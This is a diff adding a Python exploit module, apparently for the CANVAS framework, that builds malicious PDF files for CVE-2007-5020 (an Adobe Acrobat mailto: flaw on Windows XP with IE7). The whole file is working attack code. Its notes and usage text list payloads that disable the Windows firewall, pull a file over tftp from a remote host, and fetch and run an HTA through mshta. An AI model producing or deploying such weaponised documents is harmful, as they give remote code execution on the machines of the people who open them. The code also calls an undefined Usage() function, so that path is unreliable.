@@ -1,0 +1,196 @@
+#!/usr/bin/env python
+
+import sys, getopt, os
+
+sys.path.append(".")
+
+from exploitutils import *
+from canvasexploit import canvasexploit
+
+NAME = "Mailto vulnerability in Adobe Acrobat"
+DESCRIPTION = "Unspecified vulnerability in Adobe Acrobat on Windows allows remote attackers to execute arbitrary code via a crafted PDF file, related to the mailto: option and Internet Explorer 7 on Windows XP"
+
+NOTES = """
+- Windows XP (Vista users are not affected) with Internet Explorer 7 installed
+- Payload examples:
+
+../../../../windows/notepad.exe c:\windows\win.ini
+../../../../windows/system32/netsh.exe firewall set opmode=DISABLE
+../../../../windows/system32/tftp.exe 192.168.0.100 GET blaat.txt c:\\blaat
+../../../../windows/system32/mshta.exe http://192.168.0.100/test
+
+- Script file4hta.py in exploits/d2sec_uripdf/ makes a HTA page from an exe file
+- exploits/d2sec_uripdf/createpdf_poc.py is a proof of concept to create a pdf file with reportlab libraries
+"""
+
+DOCUMENTATION={}
+DOCUMENTATION["Repeatability"]="Infinite (client side - no crash)"
+DOCUMENTATION["Date public"] = "10/05/2007"
+DOCUMENTATION["CVE Name"] = "CVE-2007-5020"
+DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5020"
+DOCUMENTATION["Notes"] = NOTES
+
+VERSION = "1.0"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Clientside"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "XP" ]
+PROPERTY['MSADV'] = ""
+
+class theexploit(canvasexploit):
+	def __init__(self):
+		canvasexploit.__init__(self)
+		self.patched = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_uripdf/patched.pdf"
+		self.src = ""
+		self.dst = ""
+		self.mto = ""
+		self.quote = 0
+		self.ext = ""
+
+	def CreateNewPDF(self):
+		log = []
+	
+		f = os.popen("%s %s %s cat output %s" % (self.pdftk, self.src, self.patched, self.dst), 'r')
+		log = f.readlines()
+		f.close()
+
+		os.unlink(self.patched)
+
+		if len(log) > 0:
+			for l in log:
+				print l
+				return 1
+
+		return 0
+
+	def PatchTemplatePDF(self):
+		key = "DSQUARESECURITY"
+		orig = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_uripdf/template.pdf"
+
+		if self.mto.find(" ") >= 0:
+			self.mto = self.mto.replace(" ", "\" \"")
+		if self.mto.find("\\") >= 0:
+			self.mto = self.mto.replace("\\", "\\\\")
+		if self.mto.find("\"&\"") >= 0:
+			self.mto = self.mto.replace("\"&\"", "&")
+	
+		if self.quote == 1:
+			self.mto = self.mto + "\""
+	
+		self.mto = self.mto + self.ext
+
+		try:
+			input_file = open(orig, "rb")
+		except:
+			self.log("Can't open %s" % orig)
+			sys.exit(0)
+
+		try:
+			output_file = open(self.patched, "wb")
+		except:
+			self.log("Can't open %s" % self.patched)
+			sys.exit(0)
+
+		for s in input_file:
+			if s.find(key) < 0:
+				output_file.write(s)
+			else:
+				output_file.write(s.replace(key, self.mto))
+	
+		input_file.close()
+		output_file.close()
+
+		return
+
+	def run(self):
+		self.setInfo("%s (in progress)"%(NAME))
+		self.src = self.argsDict["source"]
+		self.dst = self.argsDict["destination"]
+		self.mto = self.argsDict["payload"]
+		self.quote = self.argsDict["quote"]
+		self.ext = self.argsDict["extension"]
+		self.pdftk = self.argsDict["pdftk"]
+
+		self.PatchTemplatePDF()
+
+		i = self.CreateNewPDF()
+		if i == 1:
+			self.log("Can't create pdf !")
+			self.setInfo("%s - done (failed)"%(NAME))	
+		else:
+			self.log("Malicious PDF file %s is created !" % self.dst)
+			self.log("source: %s" % self.src)
+			self.log("payload: %s" % self.mto)
+			self.setInfo("%s - done (success)"%(NAME))
+
+		return
+		
+def usage(app):
+	print """usage: %s [options] <arguments>\n
+  -s <pdf>  : pdf source file
+  -d <pdf>  : pdf destination file
+  -m <cmd>  : payload in mailto
+  -q        : add a quote after payload
+  -e <ext>  : choose an extension (for example .cmd, .bat)
+  -p <path> : pdftk binary path
+
+payload examples:
+
+../../../../windows/notepad.exe c:\windows\win.ini
+../../../../windows/system32/netsh.exe firewall set opmode=DISABLE
+../../../../windows/system32/tftp.exe 192.168.0.100 GET blaat.txt c:\\blaat
+../../../../windows/system32/mshta.exe http://192.168.0.100/test
+
+ie7 vulnerability:
+
+http://www.blaat.com/poc.exe?.pdf
+
+\n""" % sys.argv[0]
+	sys.exit(0)
+
+if __name__ == "__main__":
+
+	print "URIPDF (c) 2007 DSquare Security\n"
+
+	app = theexploit()
+	
+	src = dst = mto = ext = pdftk = ""
+	quote = 0
+
+	try:
+		opts = getopt.getopt(sys.argv[1:], "-hs:d:m:qe:p:")
+		for opt, optarg in opts[0]:
+			if opt == "-h":
+				Usage()
+			if opt == "-s":
+				src = optarg	
+			if opt == "-d":
+				dst = optarg
+			if opt == "-m":
+				mto = optarg
+			if opt == "-q":
+				quote += 1
+			if opt == "-e":
+				ext = optarg
+			if opt == "-p":
+				pdftk = optarg
+	except getopt.GetoptError, msg:
+		usage(app)
+	except SystemExit:
+		sys.exit(0)
+
+	if not src or not dst or not mto or not ext or not pdftk:
+		usage(app)
+
+	argsDict={}
+	argsDict["source"] = src
+	argsDict["destination"] = dst
+	argsDict["payload"] = mto
+	argsDict["quote"] = quote
+	argsDict["extension"] = ext
+	argsDict["pdftk"] = pdftk
+
+	app.argsDict = argsDict
+	app.run()
